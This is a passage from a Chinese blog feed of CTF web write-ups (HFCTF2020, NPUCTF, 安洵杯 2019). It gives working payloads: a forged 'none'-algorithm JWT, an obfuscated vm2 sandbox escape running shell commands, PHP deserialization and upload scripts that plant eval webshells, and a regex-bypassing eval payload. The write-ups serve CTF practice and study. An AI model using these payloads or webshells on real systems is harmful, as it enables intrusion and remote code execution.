class="hljs-number">5709</span>d.node<span class="hljs-number">3</span>.buuoj.cn<span class="hljs-attribute">username</span>=<span class="hljs-number">123</span>&amp;password=<span class="hljs-number">123</span>&amp;authorization=eyJhbGciOiJIUzI<span class="hljs-number">1</span>NiIsInR<span class="hljs-number">5</span>cCI<span class="hljs-number">6</span>IkpXVCJ<span class="hljs-number">9</span>.eyJzZWNyZXRpZCI<span class="hljs-number">6</span>MCwidXNlcm<span class="hljs-number">5</span>hbWUiOiIxMjMiLCJwYXNzd<span class="hljs-number">29</span>yZCI<span class="hljs-number">6</span>IjEyMyIsImlhdCI<span class="hljs-number">6</span>MTU<span class="hljs-number">4</span>NzczNTQwNn<span class="hljs-number">0</span>.<span class="hljs-number">230</span>GGloUH<span class="hljs-number">8</span>-<span class="hljs-number">4</span>DVwdSrNa<span class="hljs-number">6</span>iL<span class="hljs-number">0</span>_hCobyexp-UIpv<span class="hljs-number">43</span>O<span class="hljs-number">6</span>A</code></pre><p>注册了一个123/123，登录的时候还传进了一个authorization，目测是jwt 放网站解一解</p><p><img src="https://s1.ax1x.com/2020/04/24/Jr955D.png" alt="Jr955D.png"></p><p>再看看代码，jwt实锤，serect不知道怎么办，哪👴直接给他置为空，说干就干</p></li><li><p>UB👴哪抄来的代码</p><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> jwt=<span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;jsonwebtoken&#x27;</span>);<span class="hljs-keyword">const</span> secretid=[];a=[]<span class="hljs-keyword">const</span> secret=secretid[a];<span class="hljs-keyword">const</span> username=<span class="hljs-string">&#x27;admin&#x27;</span>;<span class="hljs-keyword">const</span> password=<span class="hljs-string">&#x27;123456&#x27;</span>;<span class="hljs-built_in">console</span>.log(jwt.sign(&#123;secretid,username,password&#125;, secret, &#123;<span class="hljs-attr">algorithm</span>: <span class="hljs-string">&#x27;none&#x27;</span>&#125;));#结果eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzZWNyZXRpZCI6W10sInVzZXJuYW1lIjoiYWRtaW4iLCJwYXNzd29yZCI6IjEyMzQ1NiIsImlhdCI6MTU4NzczNjA3OX0.</code></pre><p>当然也可以直接构造，base64完事，接下来登录就getflag抓个包就有flag</p></li></ol><p>后面从官方wp上看到 secretid为小数也可绕过，主要考点是jsonwebtoken 库的已知缺陷：当 jwt secret 为空时，jsonwebtoken 会采用 algorithm none 进行解密</p><h2 id="HFCTF2020-JustEscape"><a href="#HFCTF2020-JustEscape" class="headerlink" title="[HFCTF2020]JustEscape"></a>[HFCTF2020]JustEscape</h2><ol><li>这啥啊，👴做不来，去他🐎的nodejs，应该是代码执行吧，看WP去</li></ol><p>​    vm.js的沙箱逃逸和绕waf  逃逸在这<a href="https://github.com/patriksimek/vm2/issues/225">https://github.com/patriksimek/vm2/issues/225</a></p><ol start="2"><li><p>绕waf</p><pre><code class="hljs prolog"># github上给的攻击代码(function()&#123;<span class="hljs-symbol">TypeError</span>.prototype.get_process = f=&gt;f.constructor(<span class="hljs-string">&quot;return process&quot;</span>)();try&#123;<span class="hljs-symbol">Object</span>.preventExtensions(<span class="hljs-symbol">Buffer</span>.from(<span class="hljs-string">&quot;&quot;</span>)).a = <span class="hljs-number">1</span>;&#125;catch(e)&#123;return e.get_process(()=&gt;&#123;&#125;).mainModule.require(<span class="hljs-string">&quot;child_process&quot;</span>).execSync(<span class="hljs-string">&quot;whoami&quot;</span>).toString();&#125;&#125;)()过滤了一些关键字，赵师傅的wp得知可以通过 <span class="hljs-string">`$&#123;`</span>$&#123;<span class="hljs-string">`prototyp`</span>&#125;e<span class="hljs-string">`&#125;`</span> 拼接关键字(function ()&#123;    <span class="hljs-symbol">TypeError</span>[<span class="hljs-string">`$&#123;`</span>$&#123;<span class="hljs-string">`prototyp`</span>&#125;e<span class="hljs-string">`&#125;`</span>][<span class="hljs-string">`$&#123;`</span>$&#123;<span class="hljs-string">`get_proces`</span>&#125;s<span class="hljs-string">`&#125;`</span>] = f=&gt;f[<span class="hljs-string">`$&#123;`</span>$&#123;<span class="hljs-string">`constructo`</span>&#125;r<span class="hljs-string">`&#125;`</span>](<span class="hljs-string">`$&#123;`</span>$&#123;<span class="hljs-string">`return this.proces`</span>&#125;s<span class="hljs-string">`&#125;`</span>)();    try&#123;        <span class="hljs-symbol">Object</span>.preventExtensions(<span class="hljs-symbol">Buffer</span>.from(<span class="hljs-string">``</span>)).a = <span class="hljs-number">1</span>;    &#125;catch(e)&#123;        return e[<span class="hljs-string">`$&#123;`</span>$&#123;<span class="hljs-string">`get_proces`</span>&#125;s<span class="hljs-string">`&#125;`</span>](()=&gt;&#123;&#125;).mainModule[<span class="hljs-string">`$&#123;`</span>$&#123;<span class="hljs-string">`requir`</span>&#125;e<span class="hljs-string">`&#125;`</span>](<span class="hljs-string">`$&#123;`</span>$&#123;<span class="hljs-string">`child_proces`</span>&#125;s<span class="hljs-string">`&#125;`</span>)[<span class="hljs-string">`$&#123;`</span>$&#123;<span class="hljs-string">`exe`</span>&#125;cSync<span class="hljs-string">`&#125;`</span>](<span class="hljs-string">`whoami`</span>).toString();    &#125;&#125;)()官方<span class="hljs-symbol">WP</span>上的payload(()=&gt;&#123; <span class="hljs-symbol">TypeError</span>[[<span class="hljs-string">`p`</span>,<span class="hljs-string">`r`</span>,<span class="hljs-string">`o`</span>,<span class="hljs-string">`t`</span>,<span class="hljs-string">`o`</span>,<span class="hljs-string">`t`</span>,<span class="hljs-string">`y`</span>,<span class="hljs-string">`p`</span>,<span class="hljs-string">`e`</span>][<span class="hljs-string">`join`</span>](<span class="hljs-string">``</span>)][<span class="hljs-string">`a`</span>] = f=&gt;f[[<span class="hljs-string">`c`</span>,<span class="hljs-string">`o`</span>,<span class="hljs-string">`n`</span>,<span class="hljs-string">`s`</span>,<span class="hljs-string">`t`</span>,<span class="hljs-string">`r`</span>,<span class="hljs-string">`u`</span>,<span class="hljs-string">`c`</span>,<span class="hljs-string">`t`</span>,<span class="hljs-string">`o`</span>,<span class="hljs-string">`r`</span>][<span class="hljs-string">`join`</span>](<span class="hljs-string">``</span>)]([<span class="hljs-string">`r`</span>,<span class="hljs-string">`e`</span>,<span class="hljs-string">`t`</span>,<span class="hljs-string">`u`</span>,<span class="hljs-string">`r`</span>,<span class="hljs-string">`n`</span>,<span class="hljs-string">` `</span>,<span class="hljs-string">`p`</span>,<span class="hljs-string">`r`</span>,<span class="hljs-string">`o`</span>,<span class="hljs-string">`c`</span>,<span class="hljs-string">`e`</span>,<span class="hljs-string">`s`</span>,<span class="hljs-string">`s`</span>][<span class="hljs-string">`join`</span>](<span class="hljs-string">``</span>))(); try&#123; <span class="hljs-symbol">Object</span>[<span class="hljs-string">`preventExtensions`</span>](<span class="hljs-symbol">Buffer</span>[<span class="hljs-string">`from`</span>](<span class="hljs-string">``</span>))[<span class="hljs-string">`a`</span>] = <span class="hljs-number">1</span>; &#125;catch(e)&#123; return e[<span class="hljs-string">`a`</span>](()=&gt;&#123;&#125;)[<span class="hljs-string">`mainModule`</span>][[<span class="hljs-string">`r`</span>,<span class="hljs-string">`e`</span>,<span class="hljs-string">`q`</span>,<span class="hljs-string">`u`</span>,<span class="hljs-string">`i`</span>,<span class="hljs-string">`r`</span>,<span class="hljs-string">`e`</span>][<span class="hljs-string">`join`</span>](<span class="hljs-string">``</span>)]([<span class="hljs-string">`c`</span>,<span class="hljs-string">`h`</span>,<span class="hljs-string">`i`</span>,<span class="hljs-string">`l`</span>,<span class="hljs-string">`d`</span>,<span class="hljs-string">`_`</span>,<span class="hljs-string">`p`</span>,<span class="hljs-string">`r`</span>,<span class="hljs-string">`o`</span>,<span class="hljs-string">`c`</span>,<span class="hljs-string">`e`</span>,<span class="hljs-string">`s`</span>,<span class="hljs-string">`s`</span>][<span class="hljs-string">`join`</span>](<span class="hljs-string">``</span>))[[<span class="hljs-string">`e`</span>,<span class="hljs-string">`x`</span>,<span class="hljs-string">`e`</span>,<span class="hljs-string">`c`</span>,<span class="hljs-string">`S`</span>,<span class="hljs-string">`y`</span>,<span class="hljs-string">`n`</span>,<span class="hljs-string">`c`</span>][<span class="hljs-string">`join`</span>](<span class="hljs-string">``</span>)](<span class="hljs-string">`cat /flag`</span>)[<span class="hljs-string">`toString`</span>](); &#125; &#125;)()</code></pre></li></ol><h2 id="BabyUpload"><a href="#BabyUpload" class="headerlink" title="BabyUpload"></a>BabyUpload</h2><p>代码审计咯，就是伪造session文件  </p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>ini_set(<span class="hljs-string">&#x27;session.serialize_handler&#x27;</span>, <span class="hljs-string">&#x27;php_binary&#x27;</span>);session_save_path(<span class="hljs-string">&quot;./&quot;</span>);session_start();<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;username&#x27;</span>] = <span class="hljs-string">&#x27;admin&#x27;</span>;<span class="hljs-comment">#生成一下伪造成admin，然后就直接传一个success.txt文件夹上去，登录下就可以了</span></code></pre>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>HFCTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>NPUCTF web Wp</title>
    <link href="/2020/04/21/NPUCTF-web-Wp/"/>
    <url>/2020/04/21/NPUCTF-web-Wp/</url>
    
    <content type="html"><![CDATA[<h1 id="RealEzPHP"><a href="#RealEzPHP" class="headerlink" title="RealEzPHP"></a>RealEzPHP</h1><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-comment">#error_reporting(0);</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">HelloPhp</span></span><span class="hljs-class"></span>&#123;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$b</span>;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;        <span class="hljs-keyword">$this</span>-&gt;a = <span class="hljs-string">&#x27;file_put_contents(&quot;php://filter/write=convert.base64-decode/resource=1.php&quot;,&quot;PD9waHAgZXZhbCgkX1BPU1RbJ2EnXSk7Pz4=&quot;)&#x27;</span>;        <span class="hljs-keyword">$this</span>-&gt;b = <span class="hljs-string">&quot;assert&quot;</span>;    &#125;&#125;<span class="hljs-variable">$c</span> = <span class="hljs-keyword">new</span> HelloPhp;<span class="hljs-keyword">echo</span> serialize(<span class="hljs-variable">$c</span>);</code></pre><p>直接反序列化写马进去</p><h1 id="源代码"><a href="#源代码" class="headerlink" title="源代码"></a>源代码</h1><p>F12</p><h1 id="超简单的PHP！！！超简单！！！"><a href="#超简单的PHP！！！超简单！！！" class="headerlink" title="超简单的PHP！！！超简单！！！"></a>超简单的PHP！！！超简单！！！</h1><p>有个文件包含，可以写东西进session，限制了长度 接用/**/写shell进去</p><h1 id="ezlogin"><a href="#ezlogin" class="headerlink" title="ezlogin"></a>ezlogin</h1><p>XPATH盲注</p><p><a href="https://www.cnblogs.com/backlion/p/8554749.html">https://www.cnblogs.com/backlion/p/8554749.html</a></p><p><a href="https://guokeya.github.io/post/a2pNpf37_/">https://guokeya.github.io/post/a2pNpf37_/</a></p><h1 id="ezinclude"><a href="#ezinclude" class="headerlink" title="ezinclude"></a>ezinclude</h1><p>hash长度扩展攻击，然后  <a href="https://www.jianshu.com/p/dfd049924258">https://www.jianshu.com/p/dfd049924258</a> </p><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<span class="hljs-keyword">import</span> requests<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">12</span>):    data=os.popen(<span class="hljs-string">&#x27;hashpump -s de73312423b835b22bfdc3c6da7b63e9 -d admin -k &#x27;</span>+<span class="hljs-built_in">str</span>(i)+<span class="hljs-string">&#x27; -a admin&#x27;</span>).read()    name=data.split(<span class="hljs-string">&#x27;\n&#x27;</span>)[<span class="hljs-number">0</span>]    password=data.split(<span class="hljs-string">&#x27;\n&#x27;</span>)[<span class="hljs-number">1</span>].replace(<span class="hljs-string">&#x27;\\x&#x27;</span>,<span class="hljs-string">&#x27;%&#x27;</span>)    result=requests.get(<span class="hljs-string">&#x27;http://192.168.0.166/index.php?name=&#x27;</span>+password+<span class="hljs-string">&#x27;&amp;pass=&#x27;</span>+name).text    print(result)<span class="hljs-comment">#!/usr/bin/env python</span><span class="hljs-comment"># -*- coding: utf-8 -*-</span><span class="hljs-keyword">import</span> requests<span class="hljs-keyword">import</span> string<span class="hljs-keyword">import</span> itertoolscharset = string.digits + string.lettersbase_url = <span class="hljs-string">&quot;http://55fe8a0e-4270-4a63-b541-191e78f59a73.node3.buuoj.cn/&quot;</span> <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">upload_file_to_include</span>(<span class="hljs-params">url, file_content</span>):</span>    files = &#123;<span class="hljs-string">&#x27;file&#x27;</span>: (<span class="hljs-string">&#x27;evil.jpg&#x27;</span>, file_content, <span class="hljs-string">&#x27;image/jpeg&#x27;</span>)&#125;    <span class="hljs-keyword">try</span>:        response = requests.post(url, files=files)    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:        <span class="hljs-built_in">print</span> e<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">generate_tmp_files</span>():</span>    webshell_content = <span class="hljs-string">&#x27;&lt;?php eval($_REQUEST[c]);?&gt;&#x27;</span>.encode(        <span class="hljs-string">&quot;base64&quot;</span>).strip()    file_content = <span class="hljs-string">&#x27;&lt;?php eval($_POST[&quot;a&quot;]);if(file_put_contents(&quot;/tmp/ssh_session_HD89q2&quot;, base64_decode(&quot;%s&quot;)))&#123;echo &quot;flag&quot;;&#125;?&gt;&#x27;</span> % (        webshell_content)    phpinfo_url = <span class="hljs-string">&quot;%s/flflflflag.php?file=php://filter/string.strip_tags/resource=/etc/passwd&quot;</span> % (        base_url)    length = <span class="hljs-number">6</span>    times = <span class="hljs-built_in">len</span>(charset) ** (length / <span class="hljs-number">2</span>)    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> xrange(times):        <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;[+] %d / %d&quot;</span> % (i, times)        upload_file_to_include(phpinfo_url, file_content)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>():</span>    generate_tmp_files()<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:    main()</code></pre><h1 id="验证🐎"><a href="#验证🐎" class="headerlink" title="验证🐎"></a>验证🐎</h1><pre><code class="hljs javascript"># 源码<span class="hljs-keyword">const</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>);<span class="hljs-keyword">const</span> bodyParser = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;body-parser&#x27;</span>);<span class="hljs-keyword">const</span> cookieSession = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;cookie-session&#x27;</span>);<span class="hljs-keyword">const</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;fs&#x27;</span>);<span class="hljs-keyword">const</span> crypto = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;crypto&#x27;</span>);<span class="hljs-keyword">const</span> keys = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;./key.js&#x27;</span>).keys;<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">md5</span>(<span class="hljs-params">s</span>) </span>&#123;  <span class="hljs-keyword">return</span> crypto.createHash(<span class="hljs-string">&#x27;md5&#x27;</span>)    .update(s)    .digest(<span class="hljs-string">&#x27;hex&#x27;</span>);&#125;<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">saferEval</span>(<span class="hljs-params">str</span>) </span>&#123;  <span class="hljs-keyword">if</span> (str.replace(<span class="hljs-regexp">/(?:Math(?:\.\w+)?)|[()+\-*/&amp;|^%&lt;&gt;=,?:]|(?:\d+\.?\d*(?:e\d+)?)| /g</span>, <span class="hljs-string">&#x27;&#x27;</span>   要绕过这个正则实现代码执行                  )) &#123;    <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;  &#125;  <span class="hljs-keyword">return</span> <span class="hljs-built_in">eval</span>(str);&#125; <span class="hljs-comment">// 2020.4/WORKER1 淦，上次的库太垃圾，我自己写了一个</span><span class="hljs-keyword">const</span> template = fs.readFileSync(<span class="hljs-string">&#x27;./index.html&#x27;</span>).toString();<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">render</span>(<span class="hljs-params">results</span>) </span>&#123;  <span class="hljs-keyword">return</span> template.replace(<span class="hljs-string">&#x27;&#123;&#123;results&#125;&#125;&#x27;</span>, results.join(<span class="hljs-string">&#x27;&lt;br/&gt;&#x27;</span>));&#125;<span class="hljs-keyword">const</span> app = express();app.use(bodyParser.urlencoded(&#123; <span class="hljs-attr">extended</span>: <span class="hljs-literal">false</span> &#125;));app.use(bodyParser.json());app.use(cookieSession(&#123;  name: <span class="hljs-string">&#x27;PHPSESSION&#x27;</span>, <span class="hljs-comment">// 2020.3/WORKER2 嘿嘿，给👴爪⑧</span>  keys&#125;));<span class="hljs-built_in">Object</span>.freeze(<span class="hljs-built_in">Object</span>);<span class="hljs-built_in">Object</span>.freeze(<span class="hljs-built_in">Math</span>);app.post(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">req, res</span>) </span>&#123;  <span class="hljs-keyword">let</span> result = <span class="hljs-string">&#x27;&#x27;</span>;  <span class="hljs-keyword">const</span> results = req.session.results || [];  <span class="hljs-keyword">const</span> &#123; e, first, second &#125; = req.body;  <span class="hljs-keyword">if</span> (first &amp;&amp; second &amp;&amp; first.length === second.length &amp;&amp; first!==second &amp;&amp; md5(first+keys[<span class="hljs-number">0</span>]) === md5(second+keys[<span class="hljs-number">0</span>])) &#123;    <span class="hljs-keyword">if</span> (req.body.e) &#123;      <span class="hljs-keyword">try</span> &#123;        result = saferEval(req.body.e) || <span class="hljs-string">&#x27;Wrong Wrong Wrong!!!&#x27;</span>;      &#125; <span class="hljs-keyword">catch</span> (e) &#123;        <span class="hljs-built_in">console</span>.log(e);        result = <span class="hljs-string">&#x27;Wrong Wrong Wrong!!!&#x27;</span>;      &#125;      results.unshift(<span class="hljs-string">`<span class="hljs-subst">$&#123;req.body.e&#125;</span>=<span class="hljs-subst">$&#123;result&#125;</span>`</span>);    &#125;  &#125; <span class="hljs-keyword">else</span> &#123;    results.unshift(<span class="hljs-string">&#x27;Not verified!&#x27;</span>);  &#125;  <span class="hljs-keyword">if</span> (results.length &gt; <span class="hljs-number">13</span>) &#123;    results.pop();  &#125;  req.session.results = results;  res.send(render(req.session.results));&#125;);<span class="hljs-comment">// 2019.10/WORKER1 老板娘说她要看到我们的源代码，用行数计算KPI</span>app.get(<span class="hljs-string">&#x27;/source&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">req, res</span>) </span>&#123;  res.set(<span class="hljs-string">&#x27;Content-Type&#x27;</span>, <span class="hljs-string">&#x27;text/javascript;charset=utf-8&#x27;</span>);  res.send(fs.readFileSync(<span class="hljs-string">&#x27;./index.js&#x27;</span>));&#125;);app.get(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">req, res</span>) </span>&#123;  res.set(<span class="hljs-string">&#x27;Content-Type&#x27;</span>, <span class="hljs-string">&#x27;text/html;charset=utf-8&#x27;</span>);  req.session.admin = req.session.admin || <span class="hljs-number">0</span>;  res.send(render(req.session.results = req.session.results || []))&#125;);app.listen(<span class="hljs-number">80</span>, <span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, <span class="hljs-function">() =&gt;</span> &#123;  <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&#x27;Start listening&#x27;</span>)&#125;);#####################################################################################<span class="hljs-number">1.</span> 首先要绕过<span class="hljs-keyword">if</span> (first &amp;&amp; second &amp;&amp; first.length === second.length &amp;&amp; first!==second &amp;&amp; md5(first+keys[<span class="hljs-number">0</span>]) === md5(second+keys[<span class="hljs-number">0</span>]))这里可以传json（app.use(bodyParser.json());）有两种方式来绕：<span class="hljs-string">&quot;first&quot;</span>:&#123;<span class="hljs-string">&quot;length&quot;</span>:<span class="hljs-string">&quot;1&quot;</span>&#125;,<span class="hljs-string">&quot;second&quot;</span>:&#123;<span class="hljs-string">&quot;length&quot;</span>:<span class="hljs-string">&quot;1&quot;</span>&#125;<span class="hljs-string">&quot;first&quot;</span>:[<span class="hljs-number">1</span>],<span class="hljs-string">&quot;second&quot;</span>:<span class="hljs-string">&quot;1&quot;</span><span class="hljs-number">2.</span> str.replace(<span class="hljs-regexp">/(?:Math(?:\.\w+)?)|[()+\-*/&amp;|^%&lt;&gt;=,?:]|(?:\d+\.?\d*(?:e\d+)?)| /g</span>, <span class="hljs-string">&#x27;&#x27;</span>  要绕过这个正则实现代码执行               可以通过()=&gt;构造匿名函数<span class="hljs-keyword">import</span> reencode = lambda code: list(map(ord,code))decode = lambda code: <span class="hljs-string">&quot;&quot;</span>.join(map(chr,code))a=f<span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&quot;</span><span class="hljs-string">(m0=&gt;(</span><span class="hljs-string">        m0=m0.constructor,</span><span class="hljs-string">        m0.x=m0.constructor(</span><span class="hljs-string">            m0.fromCharCode(&#123;encode(&quot;</span><span class="hljs-keyword">return</span> process.mainModule.require(<span class="hljs-string">&#x27;child_process&#x27;</span>).execSync(<span class="hljs-string">&#x27;cat /flag&#x27;</span>)<span class="hljs-string">&quot;)&#125;)</span><span class="hljs-string">        )()</span><span class="hljs-string">    ))(Math+1)</span><span class="hljs-string">&quot;</span><span class="hljs-string">&quot;&quot;</span>a=re.sub(r<span class="hljs-string">&quot;[\s\[\]]&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, a).replace(<span class="hljs-string">&quot;m0&quot;</span>,<span class="hljs-string">&quot;Math&quot;</span>)print(a)#(Math=&gt;(Math=Math.constructor,Math.x=Math.constructor(Math.fromCharCode(114,101,116,117,114,110,32,112,114,111,99,101,115,115,46,109,97,105,110,77,111,100,117,108,101,46,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,101,120,101,99,83,121,110,99,40,39,99,97,116,32,47,102,108,97,103,39,41))()))(Math+1)最后传入&#123;<span class="hljs-string">&quot;e&quot;</span>:<span class="hljs-string">&quot;(Math=&gt;(Math=Math.constructor,Math.x=Math.constructor(Math.fromCharCode(114,101,116,117,114,110,32,112,114,111,99,101,115,115,46,109,97,105,110,77,111,100,117,108,101,46,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,101,120,101,99,83,121,110,99,40,39,99,97,116,32,47,102,108,97,103,39,41))()))(Math+1)&quot;</span>,<span class="hljs-string">&quot;first&quot;</span>:[<span class="hljs-number">0</span>],<span class="hljs-string">&quot;second&quot;</span>:<span class="hljs-number">0</span>&#125;</code></pre><p>参考：</p><p><a href="http://mo0n.top/2020/04/21/ha1cyon-ctf2020-writeup/#toc-heading-4">http://mo0n.top/2020/04/21/ha1cyon-ctf2020-writeup/#toc-heading-4</a></p><p><a href="https://guokeya.github.io/post/XxOKeal9U/">https://guokeya.github.io/post/XxOKeal9U/</a></p><p><a href="https://www.sigflag.at/blog/2020/writeup-angstromctf2020-caasio/">https://www.sigflag.at/blog/2020/writeup-angstromctf2020-caasio/</a></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>NPUCTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[安洵杯 2019]不是文件上传</title>
    <link href="/2020/04/10/%E5%AE%89%E6%B4%B5%E6%9D%AF-2019-%E4%B8%8D%E6%98%AF%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    <url>/2020/04/10/%E5%AE%89%E6%B4%B5%E6%9D%AF-2019-%E4%B8%8D%E6%98%AF%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
    
    <content type="html"><![CDATA[<h2 id="Github上下源码"><a href="#Github上下源码" class="headerlink" title="Github上下源码"></a>Github上下源码</h2><p><a href="https://github.com/Threezh1/wowouploadimage">https://github.com/Threezh1/wowouploadimage</a></p><h2 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h2><pre><code class="hljs php">总的思路是控制文件名 -&gt; 导致注入，写进序列化后的值 -&gt; show.php取出时反序列化 -&gt; 读/flag<span class="hljs-meta">&lt;?php</span><span class="hljs-comment"># helper.php</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">helper</span> </span>&#123;<span class="hljs-keyword">protected</span> <span class="hljs-variable">$folder</span> = <span class="hljs-string">&quot;pic/&quot;</span>;<span class="hljs-keyword">protected</span> <span class="hljs-variable">$ifview</span> = <span class="hljs-literal">False</span>; <span class="hljs-keyword">protected</span> <span class="hljs-variable">$config</span> = <span class="hljs-string">&quot;config.txt&quot;</span>;<span class="hljs-comment">// The function is not yet perfect, it is not open yet.</span><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">upload</span>(<span class="hljs-params"><span class="hljs-variable">$input</span>=<span class="hljs-string">&quot;file&quot;</span></span>)</span><span class="hljs-function"></span>&#123;<span class="hljs-variable">$fileinfo</span> = <span class="hljs-keyword">$this</span>-&gt;getfile(<span class="hljs-variable">$input</span>);<span class="hljs-variable">$array</span> = <span class="hljs-keyword">array</span>();<span class="hljs-variable">$array</span>[<span class="hljs-string">&quot;title&quot;</span>] = <span class="hljs-variable">$fileinfo</span>[<span class="hljs-string">&#x27;title&#x27;</span>];   <span class="hljs-comment">#文件名 无后缀</span><span class="hljs-variable">$array</span>[<span class="hljs-string">&quot;filename&quot;</span>] = <span class="hljs-variable">$fileinfo</span>[<span class="hljs-string">&#x27;filename&#x27;</span>]; <span class="hljs-comment"># 随机生成的文件名 有后缀</span><span class="hljs-variable">$array</span>[<span class="hljs-string">&quot;ext&quot;</span>] = <span class="hljs-variable">$fileinfo</span>[<span class="hljs-string">&#x27;ext&#x27;</span>]; <span class="hljs-comment"># 后缀</span><span class="hljs-variable">$array</span>[<span class="hljs-string">&quot;path&quot;</span>] = <span class="hljs-variable">$fileinfo</span>[<span class="hljs-string">&#x27;path&#x27;</span>]; <span class="hljs-comment"># 物理路径</span><span class="hljs-variable">$img_ext</span> = getimagesize(<span class="hljs-variable">$_FILES</span>[<span class="hljs-variable">$input</span>][<span class="hljs-string">&quot;tmp_name&quot;</span>]);<span class="hljs-variable">$my_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;width&quot;</span>=&gt;<span class="hljs-variable">$img_ext</span>[<span class="hljs-number">0</span>],<span class="hljs-string">&quot;height&quot;</span>=&gt;<span class="hljs-variable">$img_ext</span>[<span class="hljs-number">1</span>]);<span class="hljs-variable">$array</span>[<span class="hljs-string">&quot;attr&quot;</span>] = serialize(<span class="hljs-variable">$my_ext</span>); <span class="hljs-comment">//序列化长宽</span><span class="hljs-variable">$id</span> = <span class="hljs-keyword">$this</span>-&gt;save(<span class="hljs-variable">$array</span>);<span class="hljs-keyword">if</span> (<span class="hljs-variable">$id</span> == <span class="hljs-number">0</span>)&#123;<span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Something wrong!&quot;</span>);&#125;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p&gt;Your images is uploaded successfully. And your image&#x27;s id is <span class="hljs-subst">$id</span>.&lt;/p&gt;&quot;</span>;&#125;<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getfile</span>(<span class="hljs-params"><span class="hljs-variable">$input</span></span>)</span><span class="hljs-function"></span>&#123;<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$input</span>))&#123;<span class="hljs-variable">$rs</span> = <span class="hljs-keyword">$this</span>-&gt;check(<span class="hljs-variable">$_FILES</span>[<span class="hljs-variable">$input</span>]);&#125;<span class="hljs-keyword">return</span> <span class="hljs-variable">$rs</span>;&#125;<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check</span>(<span class="hljs-params"><span class="hljs-variable">$info</span></span>)</span><span class="hljs-function"></span>&#123;<span class="hljs-variable">$basename</span> = substr(md5(time().uniqid()),<span class="hljs-number">9</span>,<span class="hljs-number">16</span>); <span class="hljs-comment">#任意生成字符串</span><span class="hljs-variable">$filename</span> = <span class="hljs-variable">$info</span>[<span class="hljs-string">&quot;name&quot;</span>]; <span class="hljs-comment"># 文件名</span><span class="hljs-variable">$ext</span> = substr(strrchr(<span class="hljs-variable">$filename</span>, <span class="hljs-string">&#x27;.&#x27;</span>), <span class="hljs-number">1</span>); <span class="hljs-comment">#后缀名</span><span class="hljs-variable">$cate_exts</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;jpg&quot;</span>,<span class="hljs-string">&quot;gif&quot;</span>,<span class="hljs-string">&quot;png&quot;</span>,<span class="hljs-string">&quot;jpeg&quot;</span>); <span class="hljs-comment"># 后缀名白名单</span><span class="hljs-keyword">if</span>(!in_array(<span class="hljs-variable">$ext</span>,<span class="hljs-variable">$cate_exts</span>))&#123;<span 